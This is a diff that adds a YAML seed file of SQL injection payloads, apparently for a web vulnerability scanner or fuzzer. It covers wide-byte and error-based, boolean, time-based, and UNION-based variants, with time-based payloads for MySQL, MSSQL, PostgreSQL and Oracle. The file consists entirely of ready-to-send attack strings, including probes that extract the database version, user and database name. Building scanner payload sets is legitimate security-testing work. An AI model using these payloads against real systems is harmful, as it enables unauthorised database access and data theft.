@@ -1,0 +1,71 @@
+# SQLi 高级 payload：宽字节/二次编码/DBMS 专属变体
+seeds:
+  sqli:
+    error:
+      - raw: "1%bf%27"
+        ctx: ["numeric"]
+      - raw: "%bf%27 OR 1=1-- "
+        ctx: ["string"]
+      - raw: "1' OR 1=1 AND 1=1-- "
+        ctx: ["numeric"]
+      - raw: "1' AND 'a'='a'-- "
+        ctx: ["numeric"]
+      - raw: "1' OR RAND()=RAND()-- "
+        ctx: ["numeric"]
+      - raw: "1' OR 1=1 ORDER BY 1-- "
+        ctx: ["numeric"]
+      - raw: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- "
+        ctx: ["string"]
+    boolean_true:
+      - raw: "1' AND '1'='1'-- "
+        ctx: ["numeric"]
+      - raw: "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- "
+        ctx: ["string"]
+      - raw: "1 AND 1=1 AND 1=1-- "
+        ctx: ["numeric"]
+      - raw: "' AND 1=1 AND (SELECT 1)=1-- "
+        ctx: ["string"]
+    boolean_false:
+      - raw: "1' AND '1'='2'-- "
+        ctx: ["numeric"]
+      - raw: "' AND (SELECT COUNT(*) FROM information_schema.tables)<0-- "
+        ctx: ["string"]
+      - raw: "1 AND 1=1 AND 1=2-- "
+        ctx: ["numeric"]
+      - raw: "' AND 1=1 AND (SELECT 1)=2-- "
+        ctx: ["string"]
+    time_mysql:
+      - raw: "1' AND SLEEP(3) AND '1'='1"
+        dbms: "MySQL"
+      - raw: "1 AND SLEEP(3)-- "
+        dbms: "MySQL"
+      - raw: "' OR 1=1 AND SLEEP(3)#"
+        dbms: "MySQL"
+    time_mssql:
+      - raw: "1'; WAITFOR DELAY '0:0:3'-- "
+        dbms: "MSSQL"
+      - raw: "'; IF (1=1) WAITFOR DELAY '0:0:3'-- "
+        dbms: "MSSQL"
+    time_postgres:
+      - raw: "1'; SELECT pg_sleep(3)-- "
+        dbms: "PostgreSQL"
+      - raw: "'; SELECT pg_sleep(3);-- "
+        dbms: "PostgreSQL"
+    time_oracle:
+      - raw: "1' AND DBMS_PIPE.RECEIVE_MESSAGE('x',3)-- "
+        dbms: "Oracle"
+      - raw: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)-- "
+        dbms: "Oracle"
+    union:
+      - raw: "' UNION SELECT @@version,2,3-- "
+        dbms: "MySQL"
+        ctx: ["string"]
+      - raw: "1 UNION SELECT user(),2,3-- "
+        dbms: "MySQL"
+        ctx: ["numeric"]
+      - raw: "' UNION SELECT DB_NAME(),2,3-- "
+        dbms: "MSSQL"
+        ctx: ["string"]
+      - raw: "' UNION SELECT current_database(),2,3-- "
+        dbms: "PostgreSQL"
+        ctx: ["string"]
